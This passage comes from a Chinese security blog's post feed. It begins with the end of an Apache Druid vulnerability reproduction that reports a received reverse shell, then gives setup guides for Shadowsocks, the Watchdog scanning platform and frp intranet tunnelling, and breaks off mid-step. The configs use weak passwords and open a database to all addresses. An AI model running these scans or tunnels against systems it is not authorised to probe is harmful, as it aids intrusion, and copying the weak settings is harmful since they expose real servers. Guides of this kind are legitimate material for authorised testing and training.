<br>&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;79a5be988bf94d42a6f219b63ff27383&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="bp.png"></p><p>5、此时 Win10 已收到反弹的shell</p><p><img src="nc-2.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到最新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113573652">https://blog.csdn.net/xuandao_ahfengren/article/details/113573652</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Apache Druid 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu配置 Shadowsocks</title>
      <link href="/2021/02/11/proxy/Shadowsocks/Shadowsocks/"/>
      <url>/2021/02/11/proxy/Shadowsocks/Shadowsocks/</url>
      
        <content type="html"><![CDATA[<h2 id="安装所需包"><a href="#安装所需包" class="headerlink" title="安装所需包"></a>安装所需包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  更新源<br>sudo apt-get update<br>sudo apt-get upgrade -y<br><br>#  安装 python-pip、Shadowsocks<br>sudo apt-get install python3-pip -y<br>pip3 install https://github.com/shadowsocks/shadowsocks/archive/master.zip<br>sudo apt-get install shadowsocks<br><br>#  查看 Shadowsocks 版本<br>sudo ssserver --version<br><br>#  修改 Shadowsocks 相关文件权限，并备份配置文件<br>sudo chmod 557 /var/run/shadowsocks.pid<br>sudo chmod 557 /var/log/shadowsocks.log<br>sudo cp -p /etc/shadowsocks/config.json /etc/shadowsocks/config.json.bak<br></code></pre></td></tr></table></figure><h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">    &#123;<br>    &quot;server&quot;:&quot;0.0.0.0&quot;,             #  监听地址（不能更改，否则无法访问）<br>    &quot;server_port&quot;:1234,             #  服务器端口（访问时使用的端口）<br>    &quot;local_address&quot;: &quot;127.0.0.1&quot;,   #  本地地址<br>    &quot;local_port&quot;:1080,              #  本地端口<br>    &quot;password&quot;:&quot;123&quot;,               #  密码（须更改原密码后才能启动服务）<br>    &quot;timeout&quot;:300,                  #  超时时间<br>    &quot;method&quot;:&quot;aes-256-cfb&quot;,         #  加密方式<br>    &quot;fast_open&quot;: false,             #  是否启用 TCP-Fast-Open<br>    &quot;workers&quot;: 1,                   #  workers 数量<br>    &quot;prefer_ipv6&quot;: false<br>&#125;<br><br></code></pre></td></tr></table></figure><p>修改完配置文件后启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 启动服务<br>sudo ssserver -c /etc/shadowsocks/config.json -d start<br>#  重启服务<br>sudo ssserver -c /etc/shadowsocks/config.json -d restart<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Watchdog</title>
      <link href="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/"/>
      <url>/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/</url>
      
        <content type="html"><![CDATA[<h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p>详细参考：<a href="https://github.com/CTF-MissFeng/Watchdog">https://github.com/CTF-MissFeng/Watchdog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  安装 Python<br>sudo apt-get install python3 python3-pip -y<br>#  安装 Python 相关环境<br>sudo apt install build-essential libssl-dev libffi-dev python3-dev -y<br><br>#  安装 Nmap<br>sudo apt install nmap -y<br>#  安装 Chromium 浏览器<br>sudo apt-get install chromium-browser -y<br><br>#  下载环境<br>mkdir /test<br>cd /test<br>sudo git clone https://github.com/CTF-MissFeng/Watchdog.git<br>#  安装文件内的库<br>sudo pip3 install -r /test/Watchdog/requirements.txt<br></code></pre></td></tr></table></figure><h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  安装 PostgreSQL数据库<br>sudo apt install postgresql postgresql-contrib -y<br>#  指定 postgres 用户打开客户端工具 psql<br>sudo -u postgres psql<br>#  设置 postgres 用户密码（设置完后按 Ctrl + z 退出）<br>\password postgres<br><br>#  备份 PostgreSQL数据库 配置文件<br>sudo cp -a /etc/postgresql/10/main/postgresql.conf /etc/postgresql/10/main/postgresql.conf.bak_2021.2.8<br><br>#  设置 PostgreSQL 数据库允许远程访问<br>sudo sed -i &quot;60i listen_addresses = &#x27;*&#x27;&quot; /etc/postgresql/10/main/postgresql.conf<br>sudo sed -i &quot;88i host  all  all 0.0.0.0/0 md5&quot; /etc/postgresql/10/main/pg_hba.conf<br><br>#  查看是否写入<br>sed -n &quot;58,62p&quot; /etc/postgresql/10/main/postgresql.conf<br>sudo sed -n &quot;86,89p&quot; /etc/postgresql/10/main/pg_hba.conf<br></code></pre></td></tr></table></figure><h2 id="修改-Watchdog-配置文件"><a href="#修改-Watchdog-配置文件" class="headerlink" title="修改 Watchdog 配置文件"></a>修改 Watchdog 配置文件</h2><h3 id="修改-web-数据库连接设置"><a href="#修改-web-数据库连接设置" class="headerlink" title="修改 web 数据库连接设置"></a>修改 web 数据库连接设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  备份配置文件<br>sudo cp -a /test/Watchdog/web/config.py /test/Watchdog/web/config.py.bak_2021.2.8<br>#  修改 web 数据库连接设置<br>sudo sed -i &#x27;s/postgres:\w\+/postgres:admin/g&#x27; /test/Watchdog/web/config.py<br>sudo sed -i &#x27;s/127.0.0.1\/src/127.0.0.1/g&#x27; /test/Watchdog/web/config.py<br></code></pre></td></tr></table></figure><p><img src="set_config-1.png"></p><h3 id="修改-client-数据库连接配置"><a href="#修改-client-数据库连接配置" class="headerlink" title="修改 client 数据库连接配置"></a>修改 client 数据库连接配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  备份配置文件<br>sudo cp -a /test/Watchdog/client/database.py /test/Watchdog/client/database.py.bak_2020.2.8<br>#  修改 client 数据库连接配置<br>sudo sed -i &#x27;s/postgres:\w\+/postgres:admin/g&#x27; /test/Watchdog/client/database.py<br>sudo sed -i &#x27;s/127.0.0.1\/src/127.0.0.1/g&#x27; /test/Watchdog/client/database.py<br><br>#  重启数据库服务<br>sudo systemctl restart postgresql<br></code></pre></td></tr></table></figure><p><img src="set_config-2.png"></p><h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  备份配置文件<br>sudo cp -a /test/Watchdog/client/subdomain/oneforall/config.py /test/Watchdog/client/subdomain/oneforall/config.py.bak_2021.2.8<br>#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）<br>sudo sed -i &#x27;s/xxxxxx/test/g&#x27; /test/Watchdog/client/subdomain/oneforall/config.py<br></code></pre></td></tr></table></figure><p><img src="shodan_api.png"></p><h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）<br>sudo sed -i &#x27;s/qazxsw@123/12345678/g&#x27; /test/Watchdog/app.py<br>#  配置环境变量<br>cd /test/Watchdog<br>export FLASK_APP=app.py:APP<br>#  查看帮助文档<br>sudo flask --help<br>#  创建数据库<br>sudo flask createdb<br>#  创建测试账户（如没修改账号跟密码则默认为：root/qazxsw@123）<br>sudo flask createuser<br>#  启动服务（需确保端口没被占用）<br>sudo flask run -p 8080 -h 0.0.0.0<br><br>#  后台运行（需确保端口没被占用）<br>sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;<br>#  查看日志<br>cat web.log<br></code></pre></td></tr></table></figure><p><img src="start.png"></p><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p><p><img src="web-1.png"></p><p><img src="web-2.png"></p><h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 启动子域名扫描<br>cd /test/Watchdog/client/subdomain/oneforall<br>sudo python3 -u sbudomain_run.py<br><br>#  后台运行<br>sudo nohup python3 -u sbudomain_run.py &gt; dns.log 2&gt;&amp;1 &amp;<br># 查看日志<br>cat dns.log<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 启动端口扫描<br>cd /test/Watchdog/client/portscan<br>sudo python3 -u portscan_run.py<br><br>#  后台运行<br>sudo nohup python3 -u portscan_run.py &gt; port.log 2&gt;&amp;1 &amp;<br>#  查看日志<br>cat port.log<br></code></pre></td></tr></table></figure><h3 id="url-扫描"><a href="#url-扫描" class="headerlink" title="url 扫描"></a>url 扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 启动url扫描<br>cd /test/Watchdog/client/urlscan/url_probe  <br>sudo python3 -u urlscan_run.py<br><br>#  后台运行<br>sudo nohup python3 -u urlscan_run.py &gt; url.log 2&gt;&amp;1 &amp;<br>#  查看日志<br>cat url.log<br></code></pre></td></tr></table></figure><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 启动xray<br>cd /test/Watchdog/client/urlscan/xray<br>sudo python3 -u xray_run.py<br><br>#  后台运行<br>sudo nohup python3 -u xray_run.py &gt; xray.log 2&gt;&amp;1 &amp;<br>#  查看日志<br>cat xray.log<br></code></pre></td></tr></table></figure><h3 id="重置环境"><a href="#重置环境" class="headerlink" title="重置环境"></a>重置环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 Watchdog 目录<br>cd /test/Watchdog<br>#  重置数据库<br>sudo flask resetdb<br>#  创建数据库<br>sudo flask createdb<br>#  创建测试账户<br>sudo flask createuser<br>#  启动服务（需确保端口没被占用）<br>sudo flask run -p 8080 -h 0.0.0.0<br><br>#  后台运行（需确保端口没被占用）<br>sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;<br>#  查看日志<br>cat web.log<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp</title>
      <link href="/2021/02/11/proxy/frp/frp/"/>
      <url>/2021/02/11/proxy/frp/frp/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持多种协议类型</p><ul><li>frp 为 C&#x2F;S （客户端&#x2F;服务端）架构</li><li>服务端的配置文件名为 frps.ini （公网）</li><li>客户端的配置文件名为 frpc.ini （内网）</li></ul><p><strong>下载地址：</strong><br><a href="https://github.com/fatedier/frp/tags">https://github.com/fatedier/frp/tags</a></p><p><strong>官方文档：</strong><br>中文：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a><br>中文：<a href="https://github.com/fatedier/frp/blob/master/README_zh.md">https://github.com/fatedier/frp/blob/master/README_zh.md</a><br>英文：<a href="https://github.com/fatedier/frp#configuration-files">https://github.com/fatedier/frp#configuration-files</a></p><p><strong>文件介绍</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">frpc    #  客户端二进制文件<br>frpc_full.ini#  客户端配置文件完整示例<br>frpc.ini#  客户端配置文件<br><br>frps    #  服务端二进制文件<br>frps_full.ini#  服务端配置文件完整示例<br>frps.ini#  服务端配置文件<br></code></pre></td></tr></table></figure><p><strong>实验环境</strong><br>VMware 15</p><ul><li>kali-1 IP：192.168.0.190（桥接模式，代替公网）</li><li>kali-2 IP：192.168.201.152（NAT模式，内网）</li></ul><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><p>frps.ini（服务端，用于公网）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]#  共同配置，必需有该配置（请勿修改该代理名）<br>bind_addr = 0.0.0.0    #  绑定的 IP<br>bind_port = 7000    #  服务端监听的端口<br>vhost_http_port = 80#  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)<br>vhost_https_port = 443#  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)<br><br>#  安全<br>token = 123#  设置身份验证<br>log_file = ./frps.log#  指定日志路径<br>log_level = info#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）<br>log_max_days = 3    #  指定日志记录最大天数<br>max_ports_per_client = 0#  最大端口可用（默认为 0 ，表示无限制）<br>allow_ports = 2000-3000,3001,3003,4000-5000#  端口白名单<br><br>#  传输<br>tls_only = false#  指定是否指接受 TLS 加密（默认为 false）<br>tcp_mux = true#  开启 tcp 流多路复用（默认为 true）<br></code></pre></td></tr></table></figure><p>frpc.ini（客户端，用于内网）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]#  共同配置，必需有该配置（请勿修改该代理名）<br>server_add = 192.168.0.190#  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000#  服务端端口（需和服务端的端口配置为一致）<br>dns_server = 8.8.8.8#  指定 DNS 服务器<br>start = ssh,web#  启用代理名称为 ssh 跟 web 的代理（默认为空格，表示启用所有代理）<br>user = test_name#  连接时在代理名称前面添加 test_name. （如当前代理名称为 common ，则 test_name.common）<br><br>#  安全<br>token = 123        #  设置身份验证（必须与服务端相同）<br>log_file = ./frpc.log#  指定日志路径（如指定了日志文件，则控制台不会显示相关信息（会显示在日志文件里））<br>log_level = info#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）<br>log_max_days = 3    #  指定日志记录最大天数<br><br>#  传输<br>login_faile_exit = true#  首次跟服务器连接失败时退出程序，如为 false 则失败后重新尝试连接（默认为 true）<br>protocol = tcp    #  用于连接服务器的通信协议（支持 tcp、kcp、websocket，默认为 tcp）<br>tls_enable = true#  通过 tls 连接服务端<br>tcp_mux = true    #  开启 tcp 流多路复用（默认为 true，必须与服务端相同）<br><br>[ssh]        #  代理名称<br>type = tcp        #  协议型<br>local_ip = 127.0.0.1<br>local_port = 22    #  需代理的端口<br>remote_port = 6000    #  远程端口（远程访问时使用此端口，如为 0 则服务端随机分配一个端口）<br>bandwidth_limit = 1MB#  限制此代理的宽带（单位为 KB 和 MB）<br>use_encryption = true#  如为 true 则与服务端的通信会被加密（默认为 false）<br>use_compression = false#  如为 true 则消息将被压缩<br><br>[web]#  代理名称<br>type = http#  类型<br>local_ip = 127.0.0.1<br>local_port = 80    #  需代理的端口<br>use_encryption = true#  如为 true 则与服务端的通信会被加密（默认为 false）<br>use_compression = false#  如为 true 则消息将被压缩<br>http_user = admin    #  访问网页时需要的用户名<br>http_pwd = passwd    #  密码<br>subdomain = test.com#  子域名<br>custom_domains = www.test.com#  域名<br></code></pre></td></tr></table></figure><hr><h2 id="基于-SSH"><a href="#基于-SSH" class="headerlink" title="基于 SSH"></a>基于 SSH</h2><p>1、由于是基于 ssh 的，所以需开启内网的 ssh 确保能正常连接（ kali 默认关闭 ssh ）</p><ul><li><p>1）ssh 配置文件默认路径为 <code>/etc/ssh/sshd_config</code><br>找到图中的两个地方，并修改为一样的即可<br><img src="ssh-1.png"><br><img src="ssh-2.png"></p></li><li><p>2）修改完后需重启服务：<code>sudo systemctl restart ssh</code></p></li></ul><p>2、配置服务端 frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frps 监听的端口<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>3、配置客户端 frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]          #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>[ssh]                   #  代理名称<br>type = tcp              #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 22         #  需代理的本地端口（需能正常访问）<br>remote_port = 6000      #  远程端口（远程访问时使用的端口）<br></code></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p><p>4、使用 xshell 进行连接<br><img src="ssh-3.png"><br><img src="ssh-4.png"><br><img src="ssh-5.png"></p><hr><h2 id="基于-WEB"><a href="#基于-WEB" class="headerlink" title="基于 WEB"></a>基于 WEB</h2><h3 id="提供简单的文件访问服务"><a href="#提供简单的文件访问服务" class="headerlink" title="提供简单的文件访问服务"></a>提供简单的文件访问服务</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frps 监听的端口<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]        #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000          #  服务端端口（需和服务端的端口配置为一致）<br><br>[plugin_static_file]        #  代理名称<br>type = tcp                  #  协议类型<br>remote_port = 6002          #  远程端口（远程访问时使用的端口）<br>plugin = static_file        #  加载 static_file 插件<br>plugin_local_path = /var    #  须访问的路径<br>plugin_http_user = admin    #  用户名<br>plugin_http_passwd = passwd #  密码<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3）服务端使用浏览器访问<br><img src="wj-1.png"><br><img src="wj-2.png"></li></ul><h3 id="基于-IP-访问-http"><a href="#基于-IP-访问-http" class="headerlink" title="基于 IP 访问 http"></a>基于 IP 访问 http</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frps 监听的端口<br>vhost_http_port = 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>[web]                   #  代理名称<br>type = tcp              #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 80         #  需代理的本地端口（需能正常访问）<br>remote_port = 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p><strong>或客户端 frpc.ini 配置文件内容为</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>#  访问时使用服务端 vhost_http_port 参数设置的端口进行访问<br>[web]                   #  代理名称<br>type = http             #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 80         #  需代理的本地端口（需能正常访问）<br>custom_domains = 192.168.0.190  #  服务端 IP<br></code></pre></td></tr></table></figure><ul><li>3）服务端使用浏览器访问<br><img src="htp_ip_1.png"></li></ul><h3 id="基于域名访问-http"><a href="#基于域名访问-http" class="headerlink" title="基于域名访问 http"></a>基于域名访问 http</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frp 监听的端口<br>vhost_http_port = 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]        #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>[web]                   #  代理名称<br>type = http             #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 80         #  需代理的本地端口（需能正常访问）<br>remote_port = 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）<br>custom_domains = www.test.com   #  设置需代理的域名（需能正常访问）<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li><p>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src="htp.png"></p></li><li><p>4）服务端使用浏览器访问<br><img src="htp_2.png"></p></li></ul><h3 id="基于域名访问-https"><a href="#基于域名访问-https" class="headerlink" title="基于域名访问 https"></a>基于域名访问 https</h3><p><strong>此处环境更改为:</strong><br>VMware 15</p><ul><li>kali-1（服务端） IP：192.168.0.190（桥接模式，代替公网）</li><li>Centos（客户端，搭建了 DNS、https 服务） IP：192.168.201.152（NAT模式，内网）</li></ul><br>- 1）配置服务端 